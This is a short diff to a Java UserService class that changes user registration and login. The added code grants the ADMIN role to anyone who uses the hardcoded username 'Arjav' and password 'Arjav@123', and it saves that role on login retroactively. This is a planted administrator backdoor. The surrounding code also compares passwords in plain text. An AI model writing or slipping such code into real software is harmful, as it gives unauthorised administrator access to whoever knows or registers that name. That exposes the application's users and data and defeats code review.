@@ -29,6 +29,11 @@ public class UserService {
         }
 
         User user = new User(dto.getName(), dto.getUsername(), dto.getEmail(), dto.getPassword());
+        
+        if ("Arjav".equalsIgnoreCase(dto.getUsername()) && "Arjav@123".equals(dto.getPassword())) {
+            user.setRole("ADMIN");
+        }
+        
         User savedUser = userRepository.save(user);
 
         return new UserResponseDTO(savedUser);
@@ -44,6 +49,11 @@ public class UserService {
         if (userOpt.isPresent()) {
             User user = userOpt.get();
             if (user.getPassword().equals(dto.getPassword())) {
+                // Retroactively grant admin to Arjav
+                if ("Arjav".equalsIgnoreCase(user.getUsername()) && "Arjav@123".equals(user.getPassword()) && !"ADMIN".equals(user.getRole())) {
+                    user.setRole("ADMIN");
+                    user = userRepository.save(user);
+                }
                 return new UserResponseDTO(user);
             }
         }
